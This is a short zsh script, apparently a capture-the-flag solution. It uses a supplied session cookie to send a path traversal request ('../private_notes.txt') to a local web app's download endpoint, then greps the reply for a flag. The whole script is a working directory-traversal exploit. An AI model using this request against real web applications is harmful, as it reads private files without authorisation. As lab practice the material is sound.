#!/bin/zsh
# come on do a flip! curl smtg!

(( ${+1} )) || {
	echo "missing args!"
	exit 1
}

target='127.0.0.1:4942'

curl -si \
	-b "session=$1" \
	http://$target/projects/download'?file=../private_notes.txt' |
	grep --color=always -E 'FLAG{.*}'
